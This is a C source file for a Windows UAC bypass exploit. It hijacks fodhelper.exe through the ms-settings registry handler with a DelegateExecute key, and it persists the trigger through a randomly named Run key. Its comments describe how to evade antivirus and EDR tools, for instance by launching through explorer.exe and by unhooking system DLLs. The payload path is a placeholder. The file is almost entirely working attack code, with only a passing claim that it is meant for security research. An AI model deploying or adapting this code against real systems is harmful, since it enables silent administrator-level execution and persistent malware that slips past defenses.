// all modules or includes getting used in the code
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
// void deleteRegistryKey(HKEY root, const char* path) {        //You could uncommend this function to deleted regersty keys but i would recommand to do it in the payload as it will break the exploit
//     LONG result = RegDeleteKey(root, path);
// }
void addRegistryKey(HKEY root, const char* path) {  // adds a registry key to the registry with windows api (for more anti virus (av) edvasion unhook dlls like ntdll and kernel32.dll and unhook api hooks from edrs / av)
    HKEY hkey;
    LONG result = RegCreateKeyEx(root, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, NULL);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hkey);
    }
}
void setRegistryValue(HKEY root, const char* path, const char* valueName, const char* valueData) {  //set data for a registry kay with windows api (for more anti virus (av) edvasion unhook dlls like ntdll and kernel32.dll and unhook api hooks from edrs / av)
    HKEY hKey;
    LONG result = RegOpenKeyEx(root, path, 0, KEY_WRITE, &hKey);
    if (result == ERROR_SUCCESS) {
        result = RegSetValueEx(hKey, valueName, 0, REG_SZ, (const BYTE*)valueData, strlen(valueData) + 1);
        RegCloseKey(hKey);
    }
}
void generateRandomString(char *output) {   // generateds a random string for static edvasion.
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int length = rand() % 14 + 2;
    for (int i = 0; i < length; i++) {
        int randomIndex = rand() % (sizeof(charset) - 1);
        output[i] = charset[randomIndex];
    }
    output[length] = '\0';
}
int exploit() { // main exploit function
    const char* registryPath1 = "Software\\Classes\\ms-settings\\Shell\\Open\\command"; // registry path for the uac bypass (bypassing windows admin yes no screen or login screen)
    const char* registryPath2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; // registry path for staging the uac bypass trigger
    const char* exploitName = "DelegateExecute";    // registry key name for activting the uac bypass
    const char* data = "C:\\Path\\To\\Executebole_file"; // place here the full path to you're payload its mean for testing and security resures so no dynamic payload searching
    const char* data3 = "explorer.exe C:\\Windows\\System32\\fodhelper.exe";    // the data for stagin the uac bypass trigger (we use explorer.exe for edvasion so that our exe doesnt execute the fodhelper.exe imedatilly)
    srand((unsigned int)time(NULL));    // forgot for what this what
    char randomString[16]; // allocateds a buffer for maximal 16 charactors for the randomstring generation
    generateRandomString(randomString);
    addRegistryKey(HKEY_CURRENT_USER, registryPath1);
    printf("[+] Added Registry Key: %s\n", registryPath1);
    setRegistryValue(HKEY_CURRENT_USER, registryPath1, exploitName, "");
    printf("[+] Set Registry Key: %s\n", exploitName);
    setRegistryValue(HKEY_CURRENT_USER, registryPath1, "", data);
    printf("[+] Set Registry Key: %s\n", data3);
    setRegistryValue(HKEY_CURRENT_USER, registryPath2, randomString, data3);
    printf("[+] Set Registry data: %s\n", data3);
    return 0;
}
